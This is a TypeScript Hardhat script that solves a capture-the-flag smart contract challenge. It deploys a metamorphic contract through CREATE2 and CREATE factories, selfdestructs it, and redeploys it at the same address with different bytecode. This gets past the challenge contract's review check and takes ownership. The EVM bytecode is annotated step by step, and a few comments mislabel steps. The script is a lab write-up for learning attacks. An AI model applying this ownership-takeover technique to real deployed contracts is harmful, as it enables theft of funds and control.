import { ethers } from "hardhat";

const API_URL = "http://localhost:3000";

async function getChallengeDetails(): Promise<ChallengeDetails> {
  const data = await fetch(`${API_URL}/challenge`);
  return (await data.json()) as ChallengeDetails;
}

async function getFlag(): Promise<{ flag: string }> {
  const data = await fetch(`${API_URL}/challenge/solve`);

  return (await data.json()) as { flag: string };
}

async function main() {
  const details = await getChallengeDetails();

  const player_wallet = new ethers.Wallet(
    details.player_wallet.private_key,
    ethers.provider
  );

  // Attach to challenge contract
  const challenge_contract = await ethers.getContractAt(
    "Immutable",
    details.contract_address,
    player_wallet
  );

  // Deploy our CREATE2 deployer [Create2Deployer]
  const c2Fact = await ethers.getContractFactory(
    "Create2Deployer",
    player_wallet
  );
  const c2 = await c2Fact.deploy();
  console.log(`Deployed Create2Deployer deployer at: ${await c2.getAddress()}`);

  // Deploy CREATE deployer through CREATE2 through determinable address
  await (await c2.deployc1Deployer()).wait();

  // Retrieve and attach to deployed [Create1Deployer]
  const [c2deployEvent] = await c2.queryFilter(c2.filters["Deployed(address)"]);
  const c1Address = c2deployEvent.args[0];
  const c1 = await ethers.getContractAt("Create1Deployer", c1Address);
  console.log(`Deployed Create1Deployer deployer at: ${await c1.getAddress()}`);

  const selfdestructingBytecode = ethers.hexlify("0x600D8060093d393df36000FF");
  /**
   * Byte code explaination:
   * We need the deployed bytecode to be 13 bytes long to pass the first check
   * So we need our intialisation code to copy 13 bytes to the return data
   *
   * We also need the ability to self destruct this code as well. So
   *
   * This is what will be executed when we deploy our code
   * 60 0D : PUSH01 0x0D // pushes 13 to the stack which is the length of our bytecode
   * 80 : DUP [13]
   * 60 09 : PUSH1 0x09 [13, 13] // pushes 9 to the stakc which is the offset in our code where our bytecode starts
   * 3D : RETURNDATASIZE [9, 13, 13]
   * 39 : CODECOPY [0, 9, 13, 13] // Copies code to memory index 0 from offset 9 and read 13 bytes
   * 3D : RETURNDATASIZE [13]
   * F3 : RETURN [0, 13] // returns data in memory to be the deployed bytecode from mem[0] with lenght 13 bytes
   *
   * Then this is what is executed whenever we call the smart contract
   * 60 00: PUSH1 0x00 // Pushes 0  to the stack which is our selfdestruct address
   * FF : SELFDESTRUCT [0] // deletes all bytecode and sends all funds to address(0)
   * remaining bytecode to fill out the 13 bytes are all 0x00s
   */

  // Deploy our Metamorphic contract
  await (await c1.deployMetaphorphic(selfdestructingBytecode)).wait();
  const [c1deployEvent] = await c1.queryFilter(c1.filters["Deployed(address)"]);
  const metamorphicAddress = c1deployEvent.args[0];

  console.log(`Deployed Metamorphic contract at: ${metamorphicAddress}`);
  console.log(`Code: ${await ethers.provider.getCode(metamorphicAddress)}`);

  // Submit metamorphic contract to meet the 13 byte requirement
  await challenge_contract.submitContractForReview(metamorphicAddress);
  console.log("Submitted contract to challenge contract");

  // SELFDESTRUCT [Create1Deployer]
  (await c1.die()).wait();
  const c1Code = await ethers.provider.getCode(c1Address);

  if (c1Code != "0x") {
    throw Error("Could not destruct c1");
  }
  console.log("Destroyed Create1Deployer");

  // SELFDESTRUCT Metamorphic Contract
  (await player_wallet.sendTransaction({ to: metamorphicAddress })).wait();
  const metaCode = await ethers.provider.getCode(c1Address);
  if (metaCode != "0x") {
    throw Error("Could not destruct metamorphic contract");
  }
  console.log("Destroyed Create1Deployer");

  // Redeploy [Create2Deployer] at pre determined address with the same bytecode
  (await c2.deployc1Deployer()).wait();
  console.log("Redeployed Create1Deployer");

  // Redeploy metamorphic contract with DIFFERENT bytecode but with the nonce
  // reset, the address remains the same
  const bytecode1337long = ethers.hexlify("0x61053980600A3d393dF36969");

  /**
   * Byte code explaination:
   * We need the deployed bytecode to be 1337 bytes long this time
   * So we need our intialisation code to copy 1337 bytes to the return data
   *
   * We no longer need to be able to selfdestruct
   *
   * This is what will be executed when we deploy our code
   * 61 0539 : PUSH02 0x0539 // pushes 1337 to the stack which is the length of our bytecode
   * 80 : DUP [1337]
   * 60 09 : PUSH1 0x0A [1337, 1337] // pushes 10 to the stack which is the offset in our code where our bytecode starts
   * 3D : RETURNDATASIZE [10, 1337, 1337]
   * 39 : CODECOPY [0, 10, 1337, 1337] // Copies code to memory index 0 from offset 10 and read 1337 bytes
   * 3D : RETURNDATASIZE [1337]
   * F3 : RETURN [0, 1337] // returns data in memory to be the deployed bytecode from mem[0] with lenght 1337 bytes
   *
   * The actual bytecode after this doesn't matter since we don't use it. I used another 2 bytes so it is the same length
   * as the previous bytecode so it is easier for the smart contract.
   */

  (await c1.deployMetaphorphic(bytecode1337long, { gasLimit: 1e6 })).wait();
  console.log("Redeployed Metamorphic contract with different code");

  await challenge_contract.reviewContract();
  console.log("Called second function on contract we should be owner now");

  const owner = await challenge_contract.owner();
  console.log(`Player wallet: ${player_wallet.address}`);
  console.log(`Owner wallet: ${owner}`);

  console.log("Getting flag");
  console.log((await getFlag()).flag);
}

type ChallengeDetails = {
  name: string;
  description: string;
  status: string;
  player_wallet: {
    address: string;
    private_key: string;
    balance: string;
  };
  contract_address: string;
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
